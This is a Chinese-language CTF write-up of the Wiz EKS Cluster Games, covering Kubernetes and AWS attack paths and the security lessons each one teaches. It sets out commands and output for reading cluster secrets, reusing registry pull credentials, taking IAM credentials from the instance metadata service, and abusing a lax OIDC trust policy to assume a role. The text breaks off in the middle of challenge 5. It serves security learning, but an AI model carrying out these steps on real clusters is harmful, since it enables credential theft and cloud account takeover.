# 从Wiz Cluster Games 挑战赛漫谈K8s集群安全
**前言**

11月初，云安全公司WIZ发起了一项名为“EKS Cluster Games”的CTF挑战赛\[1\]，引发了众多云安全爱好者的参与。本次挑战赛的主题是关于容器集群的攻击技巧。比赛共包括5个场景，整体存在一定的难度，非常值得挑战和学习。
----------------------------------------------------------------------------------------------------------------------

通过本次“EKS Cluster Games”的CTF挑战赛的学习，我们不仅可以了解到Kubernetes中的常见攻防技术，也可以学习到集群与云产品结合后的更多攻防路径与相应的安全实践。
---------------------------------------------------------------------------------------------

下面将带领大家深入解析这些题目，通过刨析题目中设计的安全场景，来探讨题目背后所揭露的实际容器集群所面临的常见风险以及安全方案。
---------------------------------------------------------------

**Challenge 1**

### 题目：Secret Seeker

Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?

列出集群中的所有secrets，开启你的探索之旅。你能发现其中的flag吗？

已知查看当前权限：

```json
{
    "secrets": [
        "get",
        "list"
    ]
}
```

### 解题思路

拥有list/get secrets权限，因此尝试列出secrets，也可以获取secret的内容：

```perl
root@wiz-eks-challenge:~
NAME         TYPE     DATA   AGE
log-rotate   Opaque   1      26h

root@wiz-eks-challenge:~
{
    "apiVersion": "v1",
    "data": {
        "flag": "d2l6X[...]NzfQ=="
    },
    "kind": "Secret",
    "metadata": {
        "creationTimestamp": "2023-11-01T13:02:08Z",
        "name": "log-rotate",
        "namespace": "challenge1",
        "resourceVersion": "890951",
        "uid": "03f6372c-b728-4c5b-ad28-70d5af8d387c"
    },
    "type": "Opaque"
}
```

将其base64解码即可得到flag，至此题目完成。

### 安全思考:Kuberntes 中的Secret安全风险

题目1的场景是从Kuberntes Secret资源中获取到flag。Kubernetes Secret资源是Kubernetes集群中用于存储和管理敏感信息的一种资源类型。它可以用来保存和传递敏感数据，例如API密钥、数据库凭据、证书和密码等。然而Secret资源真的安全吗？并非如此。

首先，Secret中的内容仅为base64编码，当有权读取到Secret，便可以轻易解码得到明文内容。

其次，在Kubernetes集群中，secret资源具有特殊性。不仅get权限可以获取到secret内容，list/watch权限同样可以获取到secret内容，该风险在官网文档中早有说明\[2\]。

同样，不仅可以利用集群中的RBAC权限获取secret资源，当拥有节点的控制权限时，还可以通过文件系统查找secret的具体内容。

更多K8s Secret的安全内容，可以参考文章《关于 K8s 的 Secret 并不安全这件事》\[3\]。

**Challenge 2**

### 题目：Regustry Hunt

A thing we learned during our research: always check the container registries.

我们在研究过程中了解到：一定要检查容器注册表。

For your convenience, the crane utility is already pre-installed on the machine.

为方便起见，机器上已经预装了crane工具。

已知当前权限：

```json
{
    "secrets": [
        "get"
    ],
    "pods": [
        "list",
        "get"
    ]
}
```

查看当前提示1:

Try obtaining the container registry credentials to pull container images and examine them for sensitive secrets.  

尝试获取容器注册表凭据来提取容器映像，并检查它们是否存在敏感机密。

### 解题思路

在此挑战中，提示我们检查容器注册表。

因为拥有list/get pods权限，首先可以使用 kubectl 来查看正在运行的 pod 并获取pod的具体内容，看是否有发现：

```properties
root@wiz-eks-challenge:~# kubectl get pods
NAME                    READY   STATUS    RESTARTS   AGE
database-pod-2c9b3a4e   1/1     Running   0          26h
root@wiz-eks-challenge:~# kubectl get pod database-pod-2c9b3a4e -o yaml
apiVersion: v1
kind: Pod
metadata:
  name: database-pod-2c9b3a4e
  namespace: challenge2
  [...]
spec:
  containers:
  - image: eksclustergames/base_ext_image
    [...]
  [...]
  imagePullSecrets:
  - name: registry-pull-secrets-780bab1d
  [...]
status:
  [...]
```

可以发现pod的image以及secret名称，然后结合我们拥有的get secrets权限，获取secret的具体内容：

```typescript
root@wiz-eks-challenge:~# kubectl get secrets registry-pull-secrets-780bab1d -o json
{
    "apiVersion": "v1",
    "data": {
        ".dockerconfigjson": "eyJhdXR[...]RGJ3PT0ifX19"
    },
    "kind": "Secret",
    "metadata": {
        "annotations": {
            "pulumi.com/autonamed": "true"
        },
        "creationTimestamp": "2023-11-01T13:31:29Z",
        "name": "registry-pull-secrets-780bab1d",
        "namespace": "challenge2",
        "resourceVersion": "897340",
        "uid": "1348531e-57ff-42df-b074-d9ecd566e18b"
    },
    "type": "kubernetes.io/dockerconfigjson"
```

提示告诉我们，要检查容器注册表，这里提到了crane，所以我们利用crane进行后续操作。

crane是一款容器镜像管理工具\[4\]，操作时需要进行登录，示例如下：

```css
# Log in to reg.example.com
crane auth login reg.example.com -u AzureDiamond -p hunter2
```

因此我们可以尝试使用获取到的secret内容登录crane：

```ruby
root@wiz-eks-challenge:~
2023/11/13 03:24:25 logged in via /home/user/.docker/config.json
```

现在我们可以拉取镜像，使用 crane 进行操作：

```ruby
root@wiz-eks-challenge:~
root@wiz-eks-challenge:~
root@wiz-eks-challenge:/tmp
sha256:add093cd268deb7817aee1887b620628211a04e8733d22ab5c910f3b6cc91867
3f4d90098f5b5a6f6a76e9d217da85aa39b2081e30fa1f7d287138d6e7bf0ad7.tar.gz
193bf7018861e9ee50a4dc330ec5305abeade134d33d27a78ece55bf4c779e06.tar.gz
manifest.json
```

每个 *.tar.gz 文件都是镜像层之一，通过tar继续解压查看其中内容 ，发现了`flag.txt`文件：

```ruby
root@wiz-eks-challenge:/tmp
drwxr-xr-x 0/0               0 2023-11-01 13:32 etc/
-rw-r--r-- 0/0             124 2023-11-01 13:32 flag.txt
drwxr-xr-x 0/0               0 2023-11-01 13:32 proc/
-rwxr-xr-x 0/0               0 1970-01-01 00:00 proc/.wh..wh..opq
drwxr-xr-x 0/0               0 2023-11-01 13:32 sys/
-rwxr-xr-x 0/0               0 1970-01-01 00:00 sys/.wh..wh..opq

root@wiz-eks-challenge:~
wiz_eks_challenge{xxxxxx}
```

至此题目完成。

### 安全思考:容器注册表中的凭据泄露场景

题目2的场景是从容器注册表中获取flag。在真实的EKS环境中，会存在这样一种场景：业务集群有大量节点，节点为了保证pod的正常运行，会从远端容器注册表拉取私有镜像。为了保护私有镜像的安全，防止供应链攻击，容器注册表往往会有认证和授权机制。而pod用以访问容器注册表的凭据则可能存储在Secret资源中。通过以下命令可以创建容器注册表的凭据：

```sql
kubectl create secret docker-registry regcred 
```

注：在Kubernetes 1.14版本之前，secret的存储格式为dockercfg，1.14版本之后存储格式更新为dockerconfigjson。

以色列云安全公司Aqua曾对暴露在外的Kuberntes Secret的做了深入研究\[4\]，研究对象便是dockercfg和dockerconfigjson。

通过在Github上搜索关键词，得到以下结果：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/bf0950b3-b8d9-4ea6-97ed-951ce8a70588.png?raw=true)

图1 暴露的容器注册表凭据分析

Aqua共发现438条容器注册表凭据的数据。其中，203条凭据（约 46%）仍然有效。在大多数情况下，这些凭据拥有拉取和推送权限。其中还发现了SAP SE公司项目存储库的有效凭据。这些凭据提供了对超过 9500 万个项目的访问权限，以及下载和有限部署操作的权限。一旦被恶意攻击者掌握，便有可能造成代码泄露、数据泄露和供应链攻击风险，危及组织的完整性和客户的安全。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/9a669c9d-2316-4f43-aa17-4ae101c1c412.png?raw=true)

图2 泄露 SAP 机密的泄露 yaml

其中需要思考的是为什么Kubernetes secret文件会出现在Github上？Aqua给出了几个理由：上传 Kubernetes YAML 文件进行版本控制、共享模板或示例以及管理公共配置。

**Challenge 3**

### 题目：Image Inquisition

A pod's image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.

pod的镜像不仅仅包含代码。深入其ECR镜像仓库，检查镜像构建层，解开隐藏的秘密。

Remember: You are running inside a compromised EKS pod.

请记住：你正在运行的是被入侵的EKS pod。

For your convenience, the crane utility is already pre-installed on the machine.

为方便起见，机器上已经预装了crane工具。

已知当前权限：

```json
{
    "pods": [
        "list",
        "get"
    ]
}
```

### 解题思路

当前RBAC权限有限，仅能获取到pod的一些信息：

```perl
root@wiz-eks-challenge:~
NAME                      READY   STATUS    RESTARTS   AGE
accounting-pod-876647f8   1/1     Running   0          11d
root@wiz-eks-challenge:~
{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {
        "annotations": {
            "kubernetes.io/psp": "eks.privileged",
            "pulumi.com/autonamed": "true"
        },
        "creationTimestamp": "2023-11-01T13:32:10Z",
        "name": "accounting-pod-876647f8",
        "namespace": "challenge3",
        "resourceVersion": "897513",
        "uid": "dd2256ae-26ca-4b94-a4bf-4ac1768a54e2"
    },
    "spec": {
        "containers": [
            {
                "image": "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01",
                "imagePullPolicy": "IfNotPresent",
                [...]
                [...]
```

可以发现Pod 正在运行从ecr镜像仓库中拉取的镜像，但并没有拉取的权限：

```typescript
root@wiz-eks-challenge:~# crane pull 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c /tmp/image2.tar
Error: GET https:
```

那么应该如何获取ECR镜像库里的镜像呢？

### 滥用IMDSv1

此处联想到，ECR是AWS的云服务，要访问AWS的云服务资源，需要对应的云凭据。提示告诉我们，当前环境处于EKS pod中。从EKS横向移动至AWS云服务中，可以尝试以下几种方法：

1.  在集群环境中寻找云凭据，包括敏感文件、环境变量等
    
2.  有可能利用元数据服务窃取临时凭据，从而访问AWS云服务
    

使用第一种方法，并未在环境变量以及文件系统中检测到云凭据；尝试访问AWS元数据服务，发现成功返回一些信息：

```perl
root@wiz-eks-challenge:~
ami-id
ami-launch-index
ami-manifest-path
autoscaling/
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
reservation-id
security-groups
services/
system
```

可以敏锐地发现其iam接口，继续深入挖掘，获取到临时凭据：

我们可以使用它来获取 IAM 实例凭证：

```perl
root@wiz-eks-challenge:~
{
  "AccessKeyId": "ASIA2[...]E",
  "Expiration": "2023-11-02 15:46:13+00:00",
  "SecretAccessKey": "zcoLW[...]Ds",
  "SessionToken": "FwoG[...]"
}
```

我们不知道这个角色有什么 IAM 权限，但猜测它有一些权限来拉取我们看到的 pod 中引用的 ECR 镜像。  

如何使用aws ecr服务将镜像拉去到本地呢？

经查询有以下两种方式：

### 一、使用docker进行拉取

首先将获取到的临时凭据配置到本地的aws cli的配置中，然后生成docker login的登录凭据：

```cs
aws ecr get-login-password --region region | docker login --username AWS --password-stdin 688655246681.dkr.ecr.region.amazonaws.co
```

其中aws-account-id可以通过aws  sts  get-caller-identity命令获得，也可以在image名称中获得; region通过image名称可知为us-west-1。

登录成功时会显示“Login Succeeded”，然后将ECR里的镜像拉取到本地。但拉取镜像需要指定名称以及标签，因此需要通过aws ecr命令查看镜像详情：

```cs
$ aws ecr describe-repositories
/home/lucass/.local/lib/python3.6/site-packages/requests/__init__.py:104: RequestsDependencyWarning: urllib3 (1.26.9) or chardet (5.0.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  RequestsDependencyWarning)
{
    "repositories": [
        {
            "repositoryArn": "arn:aws:ecr:us-west-1:688655246681:repository/testos",
            "registryId": "688655246681",
            "repositoryName": "testos",
            "repositoryUri": "688655246681.dkr.ecr.us-west-1.amazonaws.com/testos",
            "createdAt": 1698601920.0,
            "imageTagMutability": "MUTABLE",
            "imageScanningConfiguration": {
                "scanOnPush": false
            }
        },
        {
            "repositoryArn": "arn:aws:ecr:us-west-1:688655246681:repository/central_repo-aaf4a7c",
            "registryId": "688655246681",
            "repositoryName": "central_repo-aaf4a7c",
            "repositoryUri": "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c",
            "createdAt": 1698845487.0,
            "imageTagMutability": "MUTABLE",
            "imageScanningConfiguration": {
                "scanOnPush": false
            }
        }
    ]
}


$ aws ecr describe-images --repository-name central_repo-aaf4a7c
/home/lucass/.local/lib/python3.6/site-packages/requests/__init__.py:104: RequestsDependencyWarning: urllib3 (1.26.9) or chardet (5.0.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  RequestsDependencyWarning)
{
    "imageDetails": [
        {
            "registryId": "688655246681",
            "repositoryName": "central_repo-aaf4a7c",
            "imageDigest": "sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01",
            "imageTags": [
                "374f28d8-container"
            ],
            "imageSizeInBytes": 2221349,
            "imagePushedAt": 1698845529.0
        }
    ]
}
```

可以看到镜像的标签为`374f28d8-container`，因此通过`docker pull image-name:tag`命令将其拉取到本地的:

```go
~$ sudo docker pull 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container
374f28d8-container: Pulling from central_repo-aaf4a7c
Digest: sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
Status: Image is up to date for 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container
688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container
```

结合本题的提示“检查镜像构建层”，其中有个技巧是，可以通过`docker history`命令可以查看构建镜像的每一层的详细信息，包括每一层的创建者，每一层的创建时间，以及创建每一层所执行的命令：

```sql
~$ sudo docker history 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container
IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
575a75bed1bd        11 days ago         CMD ["/bin/sleep" "3133337"]                    0B                  buildkit.dockerfile.v0
<missing>           11 days ago         RUN sh -c 
<missing>           3 months ago        /bin/sh -c 
<missing>           3 months ago        /bin/sh -c 
```

结果并未显示完整，加上`--no-trunc`显示完整信息，从而将flag显示出来，如下：

```sql
sudo docker history 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container 
IMAGE                                                                     CREATED             CREATED BY                                                                                                                                                                                                                                                                                             SIZE                COMMENT
sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3   11 days ago         CMD ["/bin/sleep" "3133337"]                                                                                                                                                                                                                                                                           0B                  buildkit.dockerfile.v0
<missing>                                                                 11 days ago         RUN sh -c 
<missing>                                                                 3 months ago        /bin/sh -c 
<missing>                                                                 3 months ago        /bin/sh -c 
```

二、使用crane进行拉取

同样先使用aws ecr生成登录凭据：

```typescript
root@wiz-eks-challenge:~# aws ecr get-login-password | crane auth login --username AWS --password-stdin 688655246681.dkr.ecr.us-west-1.amazonaws.com
2023/11/13 06:52:38 logged in via /home/user/.docker/config.json
```

然后使用 crane config 命令查看镜像层信息，flag信息由此可以获得：

```ruby
root@wiz-eks-challenge:~

{"architecture":"amd64","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sleep","3133337"],"ArgsEscaped":true,"OnBuild":null},"created":"2023-11-01T13:32:07.782534085Z","history":[{"created":"2023-07-18T23:19:33.538571854Z","created_by":"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "},{"created":"2023-07-18T23:19:33.655005962Z","created_by":"/bin/sh -c #(nop)  CMD [\"sh\"]","empty_layer":true},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{xxxxxxxxxxx} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit","comment":"buildkit.dockerfile.v0"},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"CMD [\"/bin/sleep\" \"3133337\"]","comment":"buildkit.dockerfile.v0","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f","sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"]}}
```

通过上述两种方式，我们最终都可以获取到本题flag。  

### 安全思考:易忽略的镜像层风险

题目2和3的场景均涉及到镜像层的风险利用。镜像层结构是Docker镜像的核心概念之一，它采用了分层的方式来构建和管理镜像。每个镜像都由多个只读的镜像层组成，每个层都包含了文件系统的一部分和相关的元数据。这种分层结构使得镜像的构建、共享和更新更加高效和灵活。和代码仓库commmit信息泄露类似，如果在镜像构建的过程中意外将敏感信息包含进来，可能会存在信息泄露的风险。通过`docker histoty`命令可以镜像构建过程中的信息，如图3所示：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/5f21869e-9f82-44dc-811e-09619ae4a0d7.png?raw=true)

图3 docker history结果

在WIZ针对IBM Cloud Databases for PostgreSQL 中的供应链漏洞挖掘工作中\[6\]，WIZ的安全研究员对目标IBM私有镜像进行扫描，最终发现了多个镜像的元数据文件，并从中挖掘出FTP服务凭据、内部项目存储库凭证等敏感信息：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/ba2da2dc-99d5-462e-95ef-b51af17cbc1d.png?raw=true)

图4 元数据历史记录

**Challenge 4**

### 题目:Pod Break

You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has no permissions. Can you navigate your way to access the EKS Node's privileged service-account?

你正在 EKS 集群上一个易受攻击的 pod 中。Pod 的服务帐户没有权限。你能通过利用 EKS 节点的权限访问服务帐户吗？

Please be aware: Due to security considerations aimed at safeguarding the CTF infrastructure, the node has restricted permissions

请注意：出于保护 CTF 基础设施的安全考虑，该节点的权限受到限制。

已知权限为空。

提示1：

Can't determine the cluster's name?

无法确定集群名称？

The convention for the IAM role of a node follows the pattern: \[cluster-name\]-nodegroup-NodeInstanceRole.

节点的IAM角色名称的约定模式为：\[集群名称\]- 节点组-节点实例角色

### 解题思路

本关开始，我们的服务帐户的权限为空，无法列出pod、secret的名称以及详细信息：

```typescript
root@wiz-eks-challenge:~# kubectl whoami
system:serviceaccount:challenge4:service-account-challenge4

root@wiz-eks-challenge:~# kubectl get pods
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:challenge4:service-account-challenge4" cannot list resource "pods" in API group "" in the namespace "challenge4"
```

但结合上一关的通关经验发现，我们仍然可以访问元数据服务：

```perl
root@wiz-eks-challenge:~
eks-challenge-cluster-nodegroup-NodeInstanceRole

root@wiz-eks-challenge:~
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}
```

再结合题目“正在一个EKS集群上一个易受攻击的pod中”，因此尝试操作AWS EKS服务，看是否可以获取更多信息。

关于aws某项云服务资源的操作命令，可以查看https://docs.aws.amazon.com/cli/latest/reference/，寻找EKS服务的命令如下：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/4f829da3-4eeb-48d7-9036-39d941544de1.png?raw=true)

其中一些命令值得尝试，看是否有权限，是否能获取到想要的结果。

笔者首先尝试的是`list-clusters`命令：

```ruby
root@wiz-eks-challenge:~

An error occurred (AccessDeniedException) when calling the ListClusters operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:ListClusters on resource: arn:aws:eks:us-west-1:688655246681:cluster/*
```

返回结果提示没有权限。

然后尝试`describe-cluster`命令，该命令至少需要一个“--name”参数，指定集群名称，但是如何获知集群的名称呢？刚好提示1中告诉我们“节点的IAM角色名称的约定模式为：\[集群名称\]- 节点组-节点实例角色”。由“eks-challenge-cluster-nodegroup-NodeInstanceRole”我们可以尝试拆解角色名，大胆猜测其中集群名称为“eks-challenge-cluster”，节点组为“nodegroup”，节点实例角色为“NodeInstanceRole”。

然后执行：

```ruby
root@wiz-eks-challenge:~

An error occurred (AccessDeniedException) when calling the DescribeCluster operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:DescribeCluster on resource: arn:aws:eks:us-west-1:688655246681:cluster/eks-challenge-cluster
```

返回结果依然提示没有权限。

通过翻阅资料，发现Amazon EKS支持使用IAM向Kubernetes集群提供身份验证（https://docs.aws.amazon.com/zh_cn/eks/latest/userguide/cluster-auth.html）。

因此尝试使用`get-token`创建一个令牌用以访问Kubernetes：

```typescript
root@wiz-eks-challenge:~# aws eks get-token --cluster-name eks-challenge-cluster
{
    "kind": "ExecCredential",
    "apiVersion": "client.authentication.k8s.io/v1beta1",
    "spec": {},
    "status": {
        "expirationTimestamp": "2023-11-13T07:49:07Z",
        "token": "k8s-aws-v1.aH[...]ODU5MGU"
    }
```

返回结果显示有相应地权限。

重新回到题目“你能通过利用 EKS 节点的权限访问服务帐户吗？”服务账户的值存储在secret中，因此我们尝试访问secret：

```kotlin
root@wiz-eks-challenge:~# TOKEN=k8s-aws-v1.aH[...]ODU5MGU
root@wiz-eks-challenge:~# kubectl --token "$TOKEN" get secrets
NAME        TYPE     DATA   AGE
node-flag   Opaque   1      11d

root@wiz-eks-challenge:~# kubectl --token "$TOKEN" get secrets node-flag -o json
{
    "apiVersion": "v1",
    "data": {
        "flag": "d2l6X2Vrc1[...]TURTX3RvX0VLU19jb25ncmF0c30="
    },
    "kind": "Secret",
    "metadata": {
        "creationTimestamp": "2023-11-01T12:27:57Z",
        "name": "node-flag",
        "namespace": "challenge4",
        "resourceVersion": "883574",
        "uid": "26461a29-ec72-40e1-adc7-99128ce664f7"
    },
    "type": "Opaque"
}
```

至此题目完成。

### 安全思考:高权限集群服务 token导致的集群接管

在 Kubernetes 中，对集群的访问是通过 kube-apiserver 进行的，这需要进行身份验证和授权。身份验证可以通过多种方式完成，包括使用 ServiceAccount 令牌、客户端证书、基本身份验证（用户名和密码）、静态令牌文件等。对于 AWS EKS，它使用了一种名为 "Webhook Token Authentication" 的身份验证方式。这种方式允许外部服务对令牌进行身份验证，并返回与该令牌关联的用户信息。在 EKS 中，这个外部服务就是 AWS 的 STS（Security Token Service）。

当使用 `aws eks get-token`命令时，AWS CLI 会调用 STS 的 GetCallerIdentity操作并获取一个带有签名的文档，这个文档包含了你的 AWS 身份信息。这个带有签名的文档就是你的令牌。当你使用这个令牌与 EKS 集群通信时，EKS 集群会将这个令牌发送给 STS 进行验证，STS 会返回与这个令牌关联的用户信息，这样 EKS 集群就可以知道是谁在进行操作，并对其进行相应的授权。

所以，可以使用这个令牌直接管理集群，是因为这个令牌包含了 AWS 身份信息，并且这个信息是被 AWS STS 验证过的。只要 AWS 身份被授权访问该 EKS 集群，就可以使用这个令牌进行操作。可以通过以下命令手动生成一个身份验证令牌：

```cs
 aws eks get-token --cluster <cluster_name>
```

结果会生成以“k8s-aws-v1”开头、后续为base64编码字符串的令牌：

```json
{
    "kind": "ExecCredential",
    "apiVersion": "client.authentication.Kubernetes.io/v1beta1",
    "spec": {},
    "status": {
        "expirationTimestamp": "2023-11-13T07:49:07Z",
        "token": "Kubernetes-aws-v1.aH[...]ODU5MGU"
    }
}
```

该令牌的权限与Kubernetes集群RBAC角色一样，会存在配置不当的风险，一旦权限过高，则可以利用该令牌直接管理Kubernetes集群。

**Challenge 5**

### 题目：Container Secrets Infrastructure

You've successfully transitioned from a limited Service Account to a Node Service Account! Great job.

你已成功从有限的服务账户过渡到Node服务账户！干得漂亮。

Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the s3access-sa service account, and get the flag?

下一个挑战是从EKS移动到AWS账户。你能获得s3access-sa服务账户的AWS角色，最终获取flag吗？

已知当前权限:

```bash

{
    "Policy": {
        "Statement": [
            {
                "Action": [
                    "s3:GetObject",
                    "s3:ListBucket"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2",
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag"
                ]
            }
        ],
        "Version": "2012-10-17"
    }
}
```

**IAM策略解读**：该策略**允许**用户读取名为"challenge-flag-bucket-3ff1ae2"的S3桶中的对象，以及列出桶中的对象，同时，也**允许**用户读取该桶中名为"flag"的特定对象。

```bash

{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud": "sts.amazonaws.com"
                }
            }
        }
    ]
}
```

**信任策略解读**：该IAM信任策略**允许**一个特定的OIDC提供者使用“AssumeRoleWithWebIdentity”权限来扮演这个IAM角色，当且仅当OIDC token的"aud"（）字段等于"sts.amazonaws.com"时，这个权限才会被授予。

```bash

{
    "secrets": [
        "get",
        "list"
    ],
    "serviceaccounts": [
        "get",
        "list"
    ],
    "pods": [
        "get",
        "list"
    ],
    "serviceaccounts/token": [
        "create"
    ]
}
```

**RBAC权限解读**：以上权限显示当前角色可以列出secret/serviceaccount/pod、读取secret/serviceaccount/pod的内容，并可以创建serviceaccounts/token。

### 解题思路

由题干得知：flag存储于`challenge-flag-bucket-3ff1ae2`存储桶中，我们需要获取到访问该存储桶的权限，那么需要获取到对应IAM角色的云凭据。

利用当前权限通过查看集群资源信息，返回结果如下：

```typescript
root@wiz-eks-challenge:~# kubectl get pods
No resources found in challenge5 namespace.
root@wiz-eks-challenge:~# kubectl get secrets
No resources found in challenge5 namespace.
root@wiz-eks-challenge:~# kubectl get sa     
NAME          SECRETS   AGE
debug-sa      0         12d
default       0         12d
s3access-sa   0         12d
```

当前集群仅有三个sa，查看sa的内容：

```typescript
root@wiz-eks-challenge:~# kubectl get sa debug-sa -o json
{
    "apiVersion": "v1",
    "kind": "ServiceAccount",
    "metadata": {
        "annotations": {
            "description": "This is a dummy service account with empty policy attached",
            "eks.amazonaws.com/role-arn": "arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e"
        },
        "creationTimestamp": "2023-10-31T20:07:37Z",
        "name": "debug-sa",
        "namespace": "challenge5",
        "resourceVersion": "671929",
        "uid": "6cb6024a-c4da-47a9-9050-59c8c7079904"
    }
}
root@wiz-eks-challenge:~# kubectl get sa default -o json
{
    "apiVersion": "v1",
    "kind": "ServiceAccount",
    "metadata": {
        "creationTimestamp": "2023-10-31T20:07:11Z",
        "name": "default",
        "namespace": "challenge5",
        "resourceVersion": "671804",
        "uid": "77bd3db6-3642-40d5-b8c1-14fa1b0cba8c"
    }
}
root@wiz-eks-challenge:~# kubectl get sa s3access-sa -o json
{
    "apiVersion": "v1",
    "kind": "ServiceAccount",
    "metadata": {
        "annotations": {
            "eks.amazonaws.com/role-arn": "arn:aws:iam::688655246681:role/challengeEksS3Role"
        },
        "creationTimestamp": "2023-10-31T20:07:34Z",
        "name": "s3access-sa",
        "namespace": "challenge5",
        "resourceVersion": "671916",
        "uid": "86e44c49-b05a-4ebe-800b-45183a6ebbda"
    }
}
```

其中s3access-sa中显示的角色ARN包含“S3Role”字样，猜测为最终要获取的或构建的角色的ARN。

已知我们拥有“create serviceaccounts/token”权限，因此可以尝试使用 TokenRequest API 获取一个短期令牌。经测试发现我们可以为 debug-sa 服务帐户创建令牌，但不能为 s3access-sa 创建令牌：

```sql
root@wiz-eks-challenge:~
error: failed to create token: serviceaccounts "s3access-sa" is forbidden: User "system:node:challenge:ip-192-168-21-50.us-west-1.compute.internal" cannot create resource "serviceaccounts/token" in API group "" in the namespace "challenge5"

root@wiz-eks-challenge:~
eyJhbGci[...]66B-YamXw
```

回顾信任策略，发现它仅对OIDC token的"aud"字段进行检查，并没有检查subject字段。

在Kubernetes的TokenRequest API中，sub（subject）字段通常被用来表示令牌的主体，也就是令牌的所有者。这通常是一个服务账户。如果IAM信任策略没有对sub字段进行检查，那么任何能够生成有效OIDC令牌的服务账户都可以扮演这个IAM角色。

例如，假设你有一个服务账户A，它只应该有访问某些特定资源的权限，而你的IAM角色有更广泛的权限。如果IAM信任策略没有对sub字段进行检查，那么服务账户A就可能生成一个OIDC令牌，然后扮演这个IAM角色，从而获得更广泛的权限。

在AWS EKS环境中，assume-role-with-web-identity命令常常与Kubernetes的服务账户一起使用，以便让Kubernetes中的Pod能够获得访问AWS资源的权限。以下是如何使用assume-role-with-web-identity命令的基本步骤：

1.  从身份提供者（IDP）获取一个身份令牌。这通常涉及到用户的身份验证，并且会返回一个JWT（JSON Web Token）。
    
2.  调用assume-role-with-web-identity命令，传递身份令牌和想要扮演的IAM角色的ARN（Amazon Resource Name）。例如：
    

```ruby
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::123456789012:role/FederatedWebIdentityRole \
  --role-session-name "my-session-name" \
  --web-identity-token file://path-to-token \
```

3.  assume-role-with-web-identity命令会返回一个包含临时安全凭证的响应。这个响应包括一个AccessKeyId、一个SecretAccessKey、一个SessionToken和一个过期时间。
    
4.  使用这些临时安全凭证来访问AWS资源。例如，你可以将它们设置为你的AWS SDK或者CLI的环境变量，然后使用它们来发送AWS API请求。
    

因此可以利用信任策略中存在的风险，创建我们扮演我们需要的角色值：

```typescript
root@wiz-eks-challenge:~# aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token "$TOKEN"
{
    "Credentials": {
        "AccessKeyId": "ASIA2AV[...]KDJQG7L",
        "SecretAccessKey": "U5JIhuryg[...]60GPuovIkRKmiG3+",
